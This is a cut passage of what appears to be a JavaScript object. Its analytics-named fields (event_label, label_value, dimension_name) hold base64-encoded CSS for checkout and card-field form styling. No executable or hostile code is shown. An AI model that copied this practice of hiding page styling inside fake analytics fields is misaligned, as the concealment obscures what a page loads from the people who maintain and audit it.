cGFjaW5nLWJhc2UpOw0KICAgICAgICBtYXJnaW4tdG9wOiB2YXIoLS14LXNwYWNpbmctYmFzZSkNCiAgICB9DQp9DQoNCi5fMWZyYWdlbTFlLTFxIHsNCiAgICBkaXNwbGF5OiBncmlkDQp9DQoNCi5fMWZyYWdlbTF4LTFxIHsNCiAgICByb3ctZ2FwOiB2YXIoLS14LXNwYWNpbmctYmFzZSkNCn0NCg0KLl8xZnJhZ2VtMmUtMXEgew0KICAgIGNvbHVtbi1nYXA6IHZhcigtLXgtc3BhY2luZy1iYXNlKQ0KfQ0KDQouYXBiZDYtMXEgew0KICAgIC0tcGFkZGluZy1ibG9jazogdmFyKC0teC10ZXh0LWZpZWxkLWJsb2NrLXBhZGRpbmcsIHZhcigtLXgtc3BhY2luZy1zbWFsbC0xMDApKTsNCiAgICAtLXBhZGRpbmctaW5saW5lOiB2YXIoLS14LXRleHQtZmllbGQtaW5saW5lLXBhZGRpbmcsIHZhcigtLXgtc3BhY2luZy1zbWFsbC0xMDApKTsNCiAgICAtLWZpZWxkLWZvbnQtc2l6ZTogdmFyKC0teC10ZXh0LWZpZWxkLWZvbnQtc2l6ZSwgdmFyKC0teC10eXBvZ3JhcGh5LXNpemUtZGVmYXVsdCkpOw0KICAgIC0tZmllbGQtbGluZS1oZWlnaHQ6IHZhcigtLXgtZ2xvYmFsLXR5cG9ncmFwaHktbGluZS1zaXplLWRlZmF1bHQpOw0KICAgIGRpc3BsYXk6IGdyaWQ7DQogICAgZ2FwOiB2YXIoLS14LXNwYWNpbmctc21hbGwtNDAwKQ0KfQ0KDQouXzEwdnJuOXAxLTFxIHsNCiAgICAtLWxhYmVsLWZvbnQtc2l6ZTogdmFyKC0teC1sYWJlbC1mb250LXNpemUsIHZhcigtLXgtdHlwb2dyYXBoeS1zaXplLXNtYWxsKSk7DQogICAgLS1maWVsZC1taW4taGVpZ2h0OiBjYWxjKHZhcigtLWxhYmVsLWZvbnQtc2l6ZSkgKyB2YXIoLS1maWVsZC1mb250LXNpemUpICsgdmFyKC0tcGFkZGluZy1ibG9jaykqMik7DQogICAgLS1maWxsZWQtcGFkZGluZy1ibG9jay1zdGFydDogY2FsYygodmFyKC0tZmllbGQtbWluLWhlaWdodCkgLSB2YXIoLS12YWx1ZS1oZWlnaHQpIC0gdmFyKC0tbGFiZWwtZm9udC1zaXplKSkvMiArIHZhcigtLWxhYmVsLWZvbnQtc2l6ZSkgKyAxcHgpOw0KICAgIC0tZmlsbGVkLXBhZGRpbmctYmxvY2stZW5kOiBjYWxjKHZhcigtLWZpZWxkLW1pbi1oZWlnaHQpIC0gdmFyKC0tZmlsbGVkLXBhZGRpbmctYmxvY2stc3RhcnQpIC0gdmFyKC0tdmFsdWUtaGVpZ2h0KSAtIDFweCkNCn0NCg0KQHN1cHBvcnRzICh3aWR0aDptYXgoMXB4LCAycHgpKSB7DQogICAgLl8xMHZybjlwMS0xcSB7DQogICAgICAgIC0tZmllbGQtbWluLWhlaWdodDogbWF4KGNhbGModmFyKC0tbGFiZWwtZm9udC1zaXplKSArIHZhcigtLXZhbHVlLWhlaWdodCkpLCBjYWxjKHZhcigtLWxhYmVsLWZvbnQtc2l6ZSkgKyB2YXIoLS1maWVsZC1mb250LXNpemUpICsgdmFyKC0tcGFkZGluZy1ibG9jaykqMikpDQogICAgfQ0KfQ0KDQouXzEwdnJuOXAwLTFxIHsNCiAgICAtLXZhbHVlLWhlaWdodDogY2FsYyh2YXIoLS1maWVsZC1mb250LXNpemUpKnZhcigtLWZpZWxkLWxpbmUtaGVpZ2h0KSk7DQogICAgLS1sYWJlbC1oZWlnaHQ6IGNhbGModmFyKC0tbGFiZWwtZm9udC1zaXplKSp2YXIoLS1fMTJlNTRjZjYpKTsNCiAgICAtLWVtcHR5LXBhZGRpbmctYmxvY2s6IGNhbGMoKHZhcigtLWZpZWxkLW1pbi1oZWlnaHQpIC0gdmFyKC0tdmFsdWUtaGVpZ2h0KSkvMik7DQogICAgLS1sYWJlbC1pbnNldC1ibG9jay1zdGFydDogY2FsYygodmFyKC0tZmllbGQtbWluLWhlaWdodCkgLSB2YXIoLS1maWVsZC1mb250LXNpemUpIC0gdmFyKC0tbGFiZWwtaGVpZ2h0KSkvMiAtIDFweCk7DQogICAgLS1sYWJlbC1pbnNldC1pbmxpbmUtc3RhcnQ6IGNhbGModmFyKC0tcGFkZGluZy1pbmxpbmUpICsgMXB4KQ0KfQ0KDQouXzEwdnJuOXA2LTFxIHsNCiAgICAtLXBsYWNlaG9sZGVyLWNvbG9yOiB2YXIoLS14LWNvbG9yLWNvbG9yMy10ZXh0LXN1YmR1ZWQpDQp9DQoNCltkaXI9bHRyXSAuY2VrdG5jMy0xcSB7DQogICAgbGVmdDogdmFyKC0tbGFiZWwtaW5zZXQtaW5saW5lLXN0YXJ0KQ0KfQ0KDQpbZGlyPXJ0bF0gLmNla3RuYzMtMXEgew0KICAgIHJpZ2h0OiB2YXIoLS1sYWJlbC1pbnNldC1pbmxpbmUtc3RhcnQpDQp9DQoNCi5jZWt0bmMzLTFxIHsNCiAgICBpbnNldC1ibG9jay1zdGFydDogdmFyKC0tbGFiZWwtaW5zZXQtYmxvY2stc3RhcnQpOw0KICAgIGluc2V0LWlubGluZS1zdGFydDogdmFyKC0tbGFiZWwtaW5zZXQtaW5saW5lLXN0YXJ0KTsNCiAgICBtYXgtd2lkdGg6IGNhbGMoMTAwJSAtIDEuODU3MTRlbSk7DQogICAgdG9wOiB2YXIoLS1sYWJlbC1pbnNldC1ibG9jay1zdGFydCk7DQogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC4yMTQyODU3MTQyODU3MTQyN2VtKTsNCiAgICAtd2Via2l0LXVzZXItc2VsZWN0OiBub25lOw0KICAgIHVzZXItc2VsZWN0OiBub25lDQp9DQoNCi5jZWt0bmMzLTFxIC5jZWt0bmM5LTFxIHsNCiAgICBjb2xvcjogdmFyKC0tcGxhY2Vob2xkZXItY29sb3IsIHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0LXN1YmR1ZWQsIHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0LCBpbmhlcml0KSkpDQp9DQoNCi5fMWZyYWdlbWFmLTFxIHsNCiAgICBwb2ludGVyLWV2ZW50czogbm9uZQ0KfQ0KDQouXzFmcmFnZW05eS0xcSB7DQogICAgb3BhY2l0eTogMA0KfQ0KDQouXzFmcmFnZW1iOC0xcSB7DQogICAgei1pbmRleDogMQ0KfQ0KDQouY2VrdG5jOS0xcSB7DQogICAgY29sb3I6IHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0LXN1YmR1ZWQsIHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0LCBpbmhlcml0KSk7DQogICAgZm9udC1mYW1pbHk6IHZhcigtLXgtbGFiZWwtZm9udC1mYW1pbHkpOw0KICAgIGZvbnQtc2l6ZTogdmFyKC0teC1sYWJlbC1mb250LXNpemUsIHZhcigtLXgtdHlwb2dyYXBoeS1zaXplLXNtYWxsKSk7DQogICAgZm9udC13ZWlnaHQ6IHZhcigtLXgtbGFiZWwtZm9udC13ZWlnaHQpOw0KICAgIGxldHRlci1zcGFjaW5nOiB2YXIoLS14LWxhYmVsLWxldHRlci1zcGFjaW5nKTsNCiAgICB0ZXh0LXRyYW5zZm9ybTogdmFyKC0teC1sYWJlbC10ZXh0LXRyYW5zZm9ybSkNCn0=",
    event_label: "LmNla3RuYzQtMXEgLmNla3RuYzktMXEgew0KICAgIGZvbnQtc2l6ZTogdmFyKC0teC1sYWJlbC1mb250LXNpemUsIHZhcigtLXgtdHlwb2dyYXBoeS1zaXplLWRlZmF1bHQpKQ0KfQ0KDQoucmVybXZmMS0xcSB7DQogICAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7DQogICAgd2hpdGUtc3BhY2U6IG5vd3JhcA0KfQ0KDQoub1QzMkctMXEgew0KICAgIGJvcmRlcjogMCBzb2xpZCAjMDAwMDsNCiAgICBib3JkZXItcmFkaXVzOiB2YXIoLS14LWNvbnRyb2wtYm9yZGVyLXJhZGl1cywgdmFyKC0teC1nbG9iYWwtYm9yZGVyLXJhZGl1cywgdmFyKC0teC1ib3JkZXItcmFkaXVzLWJhc2UpKSk7DQogICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIHRleHQtdHJhbnNmb3JtOiB2YXIoLS14LWdsb2JhbC10eXBvZ3JhcGh5LWxldHRlci1jYXNlKTsNCiAgICB0cmFuc2l0aW9uOiBib3gtc2hhZG93IHZhcigtLXgtZHVyYXRpb24tYmFzZSkgdmFyKC0teC10aW1pbmctYmFzZSksIGJvcmRlciB2YXIoLS14LWR1cmF0aW9uLWJhc2UpIHZhcigtLXgtdGltaW5nLWJhc2UpDQp9DQoNCi56c2FxSS0xcSB7DQogICAgLS14LWRlZmF1bHQtY29sb3ItYmFja2dyb3VuZC1zdWJkdWVkOiB2YXIoLS14LWNvbG9yLWNvbG9yMy1iYWNrZ3JvdW5kLXN1YmR1ZWQpOw0KICAgIC0teC1kZWZhdWx0LWNvbG9yLXRleHQtc3ViZHVlZDogdmFyKC0teC1jb2xvci1jb2xvcjMtdGV4dC1zdWJkdWVkKTsNCiAgICAtLXgtZGVmYXVsdC1jb2xvci1hY2NlbnQ6IHZhcigtLXgtY29sb3ItY29sb3IzLWFjY2VudCk7DQogICAgLS14LWRlZmF1bHQtY29sb3ItYmFja2dyb3VuZC1kaXNhYmxlZDogdmFyKC0teC1jb2xvci1jb2xvcjMtYmFja2dyb3VuZC1kaXNhYmxlZCk7DQogICAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0teC1jb2xvci1jb2xvcjMtYmFja2dyb3VuZCk7DQogICAgY29sb3I6IHZhcigtLXgtY29sb3ItY29sb3IzLXRleHQpDQp9DQoNCi5Ya2gwRS0xcSB7DQogICAgYm9yZGVyLWNvbG9yOiB2YXIoLS14LWRlZmF1bHQtY29sb3ItYm9yZGVyKTsNCiAgICBib3JkZXItd2lkdGg6IDFweA0KfQ0KDQouWGtoMEUtMXEuSWJMUm8tMXEuYmxvY2staW5wdXQtYWN0aXZlIHsNCiAgICBib3JkZXItY29sb3I6IHZhcigtLXgtY29sb3ItaW50ZXJhY3RpdmUtdGV4dCk7DQogICAgYm94LXNoYWRvdzogMCAwIDAgMXB4IHZhcigtLXgtY29sb3ItaW50ZXJhY3RpdmUtdGV4dCkNCn0NCg0KLlhraDBFLTFxLkliTFJvLTFxLndOWkxrLTFxLA0KLlhraDBFLTFxLkliTFJvLTFxLndOWkxrLTFxLmJsb2NrLWlucHV0LWFjdGl2ZSB7DQogICAgYm9yZGVyLWNvbG9yOiB2YXIoLS14LWNvbG9yLWNyaXRpY2FsLWFjY2VudCk7DQogICAgYm94LXNoYWRvdzogMCAwIDAgMXB4IHZhcigtLXgtY29sb3ItY3JpdGljYWwtYWNjZW50KQ0KfQ0KDQouWGtoMEUtMXEuQmtqQjQtMXEuYmxvY2staW5wdXQtYWN0aXZlIHsNCiAgICBib3JkZXItYm90dG9tLWNvbG9yOiB2YXIoLS14LWNvbG9yLWludGVyYWN0aXZlLXRleHQpOw0KICAgIGJveC1zaGFkb3c6IDAgMXB4IDAgMCB2YXIoLS14LWNvbG9yLWludGVyYWN0aXZlLXRleHQpDQp9DQoNCi5Ya2gwRS0xcS5Ca2pCNC0xcS53TlpMay0xcSwNCi5Ya2gwRS0xcS5Ca2pCNC0xcS53TlpMay0xcTpmb2N1cyB7DQogICAgYm9yZGVyLWJvdHRvbS1jb2xvcjogdmFyKC0teC1jb2xvci1jcml0aWNhbC1hY2NlbnQpOw0KICAgIGJveC1zaGFkb3c6IDAgMXB4IDAgMCB2YXIoLS14LWNvbG9yLWNyaXRpY2FsLWFjY2VudCkNCn0NCg0KLkN5MXZqLTFxLkliTFJvLTFxLmJsb2NrLWlucHV0LWFjdGl2ZSB7DQogICAgYm94LXNoYWRvdzogMCAwIDAgMnB4IHZhcigtLXgtY29sb3ItaW50ZXJhY3RpdmUtdGV4dCkNCn0NCg0KLkN5MXZqLTFxLkliTFJvLTFxLndOWkxrLTFxLA0KLkN5MXZqLTFxLkliTFJvLTFxLndOWkxrLTFxLmJsb2NrLWlucHV0LWFjdGl2ZSB7DQogICAgYm94LXNoYWRvdzogMCAwIDAgMnB4IHZhcigtLXgtY29sb3ItY3JpdGljYWwtYWNjZW50KQ0KfQ0KDQouQ3kxdmotMXEuSWJMUm8tMXEuYmxvY2staW5wdXQtYWN0aXZlIHsNCiAgICBib3gtc2hhZG93OiAwIDAgMCAycHggdmFyKC0teC1jb2xvci1pbnRlcmFjdGl2ZS10ZXh0KQ0KfQ0KDQouQ3kxdmotMXEuSWJMUm8tMXEud05aTGstMXEsDQouQ3kxdmotMXEuSWJMUm8tMXEud05aTGstMXEuYmxvY2staW5wdXQtYWN0aXZlIHsNCiAgICBib3gtc2hhZG93OiAwIDAgMCAycHggdmFyKC0teC1jb2xvci1jcml0aWNhbC1hY2NlbnQpDQp9DQoNCi54SU44Vi0xcSB7DQogICAgYm9yZGVyLXJhZGl1czogdmFyKC0teC1jb250cm9sLWJvcmRlci1yYWRpdXMsIHZhcigtLXgtZ2xvYmFsLWJvcmRlci1yYWRpdXMsIHZhcigtLXgtYm9yZGVyLXJhZGl1cy1iYXNlKSkpOw0KICAgIGhlaWdodDogdmFyKC0tZmllbGQtbWluLWhlaWdodCk7DQogICAgb3ZlcmZsb3c6IGhpZGRlbg0KfQ0KDQpbZGlyPWx0cl0gLkY4d2VVLTFxIC5jYXJkLWZpZWxkcy1pZnJhbWUgew0KICAgIHBhZGRpbmctcmlnaHQ6IDMuMTQyODU3MTQyODU3MTQzZW07DQp9DQoNCltkaXI9cnRsXSAuRjh3ZVUtMXEgLmNhcmQtZmllbGRzLWlmcmFtZSB7DQogICAgcGFkZGluZy1sZWZ0OiAzLjE0Mjg1NzE0Mjg1NzE0M2VtOw0KfQ0KDQouRjh3ZVUtMXEgLmNhcmQtZmllbGRzLWlmcmFtZSB7DQogICAgcGFkZGluZy1pbmxpbmUtZW5kOiAzLjE0Mjg1NzE0Mjg1NzE0M2VtOw0KfQ0KDQpbZGlyPWx0cl0gLmZCTkhELTFxIC5jYXJkLWZpZWxkcy1pZnJhbWUgew0KICAgIHBhZGRpbmctcmlnaHQ6IDMuNDI4NTcxNDI4NTcxNDI4NGVtDQp9DQoNCltkaXI9cnRsXSAuZkJOSEQtMXEgLmNhcmQtZmllbGRzLWlmcmFtZSB7DQogICAgcGFkZGluZy1sZWZ0OiAzLjQyODU3MTQyODU3MTQyODRlbTsNCn0NCg0KLmZCTkhELTFxIC5jYXJkLWZpZWxkcy1pZnJhbWUgew0KICAgIHBhZGRpbmctaW5saW5lLWVuZDogMy40Mjg1NzE0Mjg1NzE0Mjg0ZW07DQp9DQoNCltkaXI9bHRyXSAuUDdLQVQtMXEgew0KICAgIHJpZ2h0OiB2YXIoLS14LXNwYWNpbmctYmFzZSkNCn0NCg0KW2Rpcj1ydGxdIC5QN0tBVC0xcSB7DQogICAgbGVmdDogdmFyKC0teC1zcGFjaW5nLWJhc2UpDQp9DQoNCi5QN0tBVC0xcSB7DQogICAgaW5zZXQtYmxvY2stc3RhcnQ6IDUwJTsNCiAgICBpbnNldC1pbmxpbmUtZW5kOiB2YXIoLS14LXNwYWNpbmctYmFzZSk7DQogICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIHRvcDogNTAlOw0KICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKQ0KfQ==",
    label_value: "Ll8xZnJhZ2VtMzctMXEgew0KICAgIHdpZHRoOiAxMDAlOw0KICAgIGlubGluZS1zaXplOiAxMDAlDQp9DQoNCi5fMWZyYWdlbTEwLTFxIHsNCiAgICBoZWlnaHQ6IDEwMCU7DQogICAgYmxvY2stc2l6ZTogMTAwJQ0KfQ0KDQouXzFmcmFnZW05dC0xcSB7DQogICAgbWF4LXdpZHRoOiAxMDAlOw0KICAgIG1heC1pbmxpbmUtc2l6ZTogMTAwJQ0KfQ0KDQouXzFmcmFnZW05cy0xcSB7DQogICAgbWF4LWhlaWdodDogMTAwJTsNCiAgICBtYXgtYmxvY2stc2l6ZTogMTAwJQ0KfQ0KDQouYTh4MXd1NS0xcSB7DQogICAgY29sb3I6IHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0LXN1YmR1ZWQsIHZhcigtLXgtZGVmYXVsdC1jb2xvci10ZXh0LCBpbmhlcml0KSkNCn0NCg0KLmE4eDF3dWktMXEgew0KICAgIC0tYTh4MXd1MDogY2FsYyh2YXIoLS14LXR5cG9ncmFwaHktc2l6ZS1kZWZhdWx0KSoxLjI4NTcxKQ0KfQ0KDQouYTh4MXd1aS0xcSwNCi5hOHgxd3VqLTFxIHsNCiAgICBoZWlnaHQ6IHZhcigtLWE4eDF3dTApOw0KICAgIG1pbi1oZWlnaHQ6IHZhcigtLWE4eDF3dTApOw0KICAgIG1pbi13aWR0aDogdmFyKC0tYTh4MXd1MCk7DQogICAgd2lkdGg6IHZhcigtLWE4eDF3dTApDQp9DQoNCi5hOHgxd3VtLTFxIHsNCiAgICBzdHJva2U6IGN1cnJlbnRDb2xvcg0KfQ0KDQouYTh4MXd1by0xcSB7DQogICAgZmlsbDogbm9uZQ0KfQ0KDQouYTh4MXd1by0xcSBjaXJjbGUsDQouYTh4MXd1by0xcSBwYXRoIHsNCiAgICB2ZWN0b3ItZWZmZWN0OiBub24tc2NhbGluZy1zdHJva2U7DQogICAgc3Ryb2tlLXdpZHRoOiAxLjRweDsNCn0NCg0KW2Rpcj1sdHJdIC51RzZLMS0xcSB7DQogICAgbGVmdDogMA0KfQ0KDQpbZGlyPXJ0bF0gLnVHNksxLTFxIHsNCiAgICByaWdodDogMA0KfQ0KDQoudUc2SzEtMXEgew0KICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLXgtZGVmYXVsdC1jb2xvci1iYWNrZ3JvdW5kLWRpc2FibGVkKTsNCiAgICBib3JkZXItcmFkaXVzOiB2YXIoLS14LWNvbnRyb2wtYm9yZGVyLXJhZGl1cywgdmFyKC0teC1nbG9iYWwtYm9yZGVyLXJhZGl1cywgdmFyKC0teC1ib3JkZXItcmFkaXVzLWJhc2UpKSk7DQogICAgaGVpZ2h0OiAxMDAlOw0KICAgIGluc2V0LWJsb2NrLXN0YXJ0OiAwOw0KICAgIGluc2V0LWlubGluZS1zdGFydDogMDsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgdG9wOiAwOw0KICAgIHdpZHRoOiAxMDAlOw0KICAgIHotaW5kZXg6IDENCn0NCg0KLnVHNksxLTFxLkRPbGRmLTFxIHsNCiAgICBvcGFjaXR5OiAwOw0KICAgIHBvaW50ZXItZXZlbnRzOiBub25lOw0KICAgIHRyYW5zaXRpb246IG9wYWNpdHkgdmFyKC0teC1kdXJhdGlvbi1zbG93ZXN0KSBlYXNlLW91dA0KfQ0KDQouRE9sZGYtMXEgLkllc1FwLTFxIHsNCiAgICBvcGFjaXR5OiAwDQp9DQoNCi5JZXNRcC0xcSB7DQogICAgYW5pbWF0aW9uOiBib3RoIDFzIGVhc2UtaW4tb3V0IGluZmluaXRlIG5vbmU7DQogICAgYmFja2dyb3VuZDogdmFyKC0teC1kZWZhdWx0LWNvbG9yLWJvcmRlcik7DQogICAgYm9yZGVyLXJhZGl1czogLjU3MTQyODU3MTQyODU3MTRlbTsNCiAgICBjb250ZW50OiAiIjsNCiAgICBoZWlnaHQ6IDFlbTsNCiAgICBpbnNldC1ibG9jay1zdGFydDogNTAlOw0KICAgIG1hcmdpbi1ibG9jay1zdGFydDogLS41ZW07DQogICAgbWFyZ2luLXRvcDogLS41ZW07DQogICAgb3BhY2l0eTogMTsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgdG9wOiA1MCU7DQogICAgdHJhbnNpdGlvbjogb3BhY2l0eSB2YXIoLS14LWR1cmF0aW9uLWJhc2UpIGVhc2Utb3V0Ow0KICAgIHotaW5kZXg6IDENCn0NCg0KLkRPbGRmLTFxIC5JZXNRcC0xcSB7DQogICAgb3BhY2l0eTogMA0KfQ0KDQpbZGlyPWx0cl0gLkllc1FwLTFxIHsNCiAgICBhbmltYXRpb24tbmFtZTogblcxbTcNCn0NCg0KW2Rpcj1ydGxdIC5JZXNRcC0xcSB7DQogICAgYW5pbWF0aW9uLW5hbWU6IFZFQUlZDQp9DQoNCi5CX3BuSi0xcSB7DQogICAgYm9yZGVyLXJhZGl1czogdmFyKC0teC1jb250cm9sLWJvcmRlci1yYWRpdXMsIHZhcigtLXgtZ2xvYmFsLWJvcmRlci1yYWRpdXMsIHZhcigtLXgtYm9yZGVyLXJhZGl1cy1iYXNlKSkpOw0KICAgIGhlaWdodDogdmFyKC0tZmllbGQtbWluLWhlaWdodCk7DQogICAgb3ZlcmZsb3c6IGhpZGRlbg0KfQ0KDQouVDUwUGEtMXEgew0KICAgIGRpc3BsYXk6IGZsZXg7DQogICAgaGVpZ2h0OiAxMDAlOw0KICAgIHBvc2l0aW9uOiByZWxhdGl2ZQ0KfQ0KDQouUHlweUktMXEgew0KICAgIGFsaWduLWl0ZW1zOiBmbGV4LXN0YXJ0DQp9DQoNCi5yaFV0Si0xcSB7DQogICAganVzdGlmeS1jb250ZW50OiBjZW50ZXINCn0NCg0KLmk2MDJNLTFxIHsNCiAgICBhbGlnbi1pdGVtczogZmxleC1zdGFydDsNCiAgICBkaXNwbGF5OiBmbGV4Ow0KICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICAgIHdpZHRoOiAxMDAlDQp9DQoNCltkaXI9bHRyXSAuVDlmYVgtMXEgew0KICAgIG1hcmdpbi1sZWZ0OiBjYWxjKHZhcigtLXgtc3BhY2luZy1iYXNlKSotMSkNCn0=",
    dimension_name: "W2Rpcj1ydGxdIC5UOWZhWC0xcSB7DQogICAgbWFyZ2luLXJpZ2h0OiBjYWxjKHZhcigtLXgtc3BhY2luZy1iYXNlKSotMSkNCn0NCg0KLlQ5ZmFYLTFxIHsNCiAgICBtYXJnaW4tYmxvY2stc3RhcnQ6IGNhbGModmFyKC0teC1zcGFjaW5nLWJhc2UpKi0xKTsNCiAgICBtYXJnaW4tdG9wOiBjYWxjKHZhcigtLXgtc3BhY2luZy1iYXNlKSotMSk7DQogICAgbWFyZ2luLWlubGluZS1zdGFydDogY2FsYyh2YXIoLS14LXNwYWNpbmctYmFzZSkqLTEpOw0KICAgIHdpZHRoOiBjYWxjKDEwMCUgKyB2YXIoLS14LXNwYWNpbmctYmFzZSkpDQp9DQoNCltkaXI9bHRyXSAucXlXYzItMXE+KiB7DQogICAgbWFyZ2luLWxlZnQ6IHZhcigtLXgtc3BhY2luZy1iYXNlKQ0KfQ0KDQpbZGlyPXJ0bF0gLnF5V2MyLTFxPiogew0KICAgIG1hcmdpbi1yaWdodDogdmFyKC0teC1zcGFjaW5nLWJhc2UpDQp9DQoNCi5xeVdjMi0xcT4qIHsNCiAgICBtYXJnaW4tYmxvY2stc3RhcnQ6IHZhcigtLXgtc3BhY2luZy1iYXNlKTsNCiAgICBtYXJnaW4tdG9wOiB2YXIoLS14LXNwYWNpbmctYmFzZSk7DQogICAgbWFyZ2luLWlubGluZS1zdGFydDogdmFyKC0teC1zcGFjaW5nLWJhc2UpDQp9DQoNCi5fMXhxZWx2aTEtMXEgew0KICAgIC13ZWJraXQtdGFwLWhpZ2hsaWdodC1jb2xvcjogdHJhbnNwYXJlbnQ7DQogICAgLXdlYmtpdC10b3VjaC1jYWxsb3V0OiBub25lOw0KICAgIGNvbG9yOiBpbmhlcml0Ow0KICAgIG91dGxpbmU6IDFweCBzb2xpZCAjMDAwMDsNCiAgICB0ZXh0LWRlY29yYXRpb246IGluaGVyaXQNCn0NCg0KW2Rpcj1sdHJdIC5fMXhxZWx2aTEtMXE6YWZ0ZXIgew0KICAgIGJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IGluaGVyaXQNCn0NCg0KW2Rpcj1ydGxdIC5fMXhxZWx2aTEtMXE6YWZ0ZXIgew0KICAgIGJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiBpbmhlcml0DQp9DQoNCltkaXI9bHRyXSAuXzF4cWVsdmkxLTFxOmFmdGVyIHsNCiAgICBib3JkZXItdG9wLXJpZ2h0LXJhZGl1czogaW5oZXJpdA0KfQ0KDQpbZGlyPWx0cl0gLl8xeHFlbHZpMS0xcTphZnRlciwNCltkaXI9cnRsXSAuXzF4cWVsdmkxLTFxOmFmdGVyIHsNCiAgICBib3JkZXItdG9wLWxlZnQtcmFkaXVzOiBpbmhlcml0DQp9DQoNCltkaXI9cnRsXSAuXzF4cWVsdmkxLTFxOmFmdGVyIHsNCiAgICBib3JkZXItdG9wLXJpZ2h0LXJhZGl1czogaW5oZXJpdA0KfQ0KDQpbZGlyPWx0cl0gLl8xeHFlbHZpMS0xcTphZnRlciB7DQogICAgYm9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6IGluaGVyaXQNCn0NCg0KW2Rpcj1ydGxdIC5fMXhxZWx2aTEtMXE6YWZ0ZXIgew0KICAgIGJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IGluaGVyaXQNCn0NCg0KW2Rpcj1sdHJdIC5fMXhxZWx2aTEtMXE6YWZ0ZXIgew0KICAgIGxlZnQ6IGNhbGModmFyKC0tXzEzcXozNXkwLCAwcHgpKi0xIC0gMXB4KQ0KfQ0KDQpbZGlyPXJ0bF0gLl8xeHFlbHZpMS0xcTphZnRlciB7DQogICAgcmlnaHQ6IGNhbGModmFyKC0tXzEzcXozNXkwLCAwcHgpKi0xIC0gMXB4KQ0KfQ0KDQpbZGlyPWx0cl0gLl8xeHFlbHZpMS0xcTphZnRlciB7DQogICAgcmlnaHQ6IGNhbGModmFyKC0tXzEzcXozNXkxLCAwcHgpKi0xIC0gMXB4KQ0KfQ0KDQpbZGlyPXJ0bF0gLl8xeHFlbHZpMS0xcTphZnRlciB7DQogICAgbGVmdDogY2FsYyh2YXIoLS1fMTNxejM1eTEsIDBweCkqLTEgLSAxcHgpDQp9DQoNCi5fMXhxZWx2aTEtMXE6YWZ0ZXIgew0KICAgIGJvcmRlci1lbmQtZW5kLXJhZGl1czogaW5oZXJpdDsNCiAgICBib3JkZXItZW5kLXN0YXJ0LXJhZGl1czogaW5oZXJpdDsNCiAgICBib3JkZXItc3RhcnQtZW5kLXJhZGl1czogaW5oZXJpdDsNCiAgICBib3JkZXItc3RhcnQtc3RhcnQtcmFkaXVzOiBpbmhlcml0Ow0KICAgIGJvdHRvbTogY2FsYyh2YXIoLS1fMTNxejM1eTMsIDBweCkqLTEgLSAxcHgpOw0KICAgIGJveC1zaGFkb3c6IDAgMCAwIDAgIzAwMDA7DQogICAgY29udGVudDogIiI7DQogICAgZGlzcGxheTogYmxvY2s7DQogICAgaW5zZXQtYmxvY2stZW5kOiBjYWxjKHZhcigtLV8xM3F6MzV5MywgMHB4KSotMSAtIDFweCk7DQogICAgaW5zZXQtYmxvY2stc3RhcnQ6IGNhbGModmFyKC0tXzEzcXozNXkyLCAwcHgpKi0xIC0gMXB4KTsNCiAgICBpbnNldC1pbmxpbmUtZW5kOiBjYWxjKHZhcigtLV8xM3F6MzV5MSwgMHB4KSotMSAtIDFweCk7DQogICAgaW5zZXQtaW5saW5lLXN0YXJ0OiBjYWxjKHZhcigtLV8xM3F6MzV5MCwgMHB4KSotMSAtIDFweCk7DQogICAgcG9pbnRlci1ldmVudHM6IG5vbmU7DQogICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIHRvcDogY2FsYyh2YXIoLS1fMTNxejM1eTIsIDBweCkqLTEgLSAxcHgpOw0KICAgIHRyYW5zaXRpb246IGluaGVyaXQ7DQogICAgei1pbmRleDogMQ0KfQ0KDQouXzF4cWVsdmkxLTFxOmRpc2FibGVkIHsNCiAgICBjdXJzb3I6IGRlZmF1bHQ7DQogICAgb3BhY2l0eTogdmFyKC0teC1vcGFjaXR5LWRpc2FibGVkKTsNCiAgICBwb2ludGVyLWV2ZW50czogbm9uZQ0KfQ0KDQouXzF4cWVsdmkxLTFxOmZvY3VzOmFmdGVyIHsNCiAgICBib3gtc2hhZG93OiAwIDAgMCAuMnJlbSB2YXIoLS14LWNvbG9yLWludGVyYWN0aXZlLXRleHQpDQp9DQoNCi5fMXhxZWx2aTEtMXE6Zm9jdXM6bm90KDpmb2N1cy12aXNpYmxlKTphZnRlciB7DQogICAgYm94LXNoYWRvdzogbm9uZQ0KfQ0KDQouXzF4cWVsdmkxLTFxOmZvY3VzLXZpc2libGU6YWZ0ZXIgew0KICAgIGJveC1zaGFkb3c6IDAgMCAwIC4ycmVtIHZhcigtLXgtY29sb3ItaW50ZXJhY3RpdmUtdGV4dCkNCn0NCg0KLl8xeHFlbHZpMS0xcT4uXzF4cWVsdmkyLTFxIHsNCiAgICBmbGV4LWdyb3c6IDENCn0NCg0KW2Rpcj1sdHJdIC5fMWZyYWdlbWFuLTFxIHsNCiAgICB0ZXh0LWFsaWduOiBsZWZ0DQp9DQoNCltkaXI9cnRsXSAuXzFmcmFnZW1hbi0xcSB7DQogICAgdGV4dC1hbGlnbjogcmlnaHQNCn0NCg0KLl8xZnJhZ2VtYW4tMXEgew0KICAgIHRleHQtYWxpZ246IHN0YXJ0DQp9DQoNCi5fMWZyYWdlbTctMXEgew0KICAgIGFsaWduLWl0ZW1zOiBzdHJldGNoDQp9DQoNCi5fMWZyYWdlbTFnLTFxIHsNCiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uDQp9",
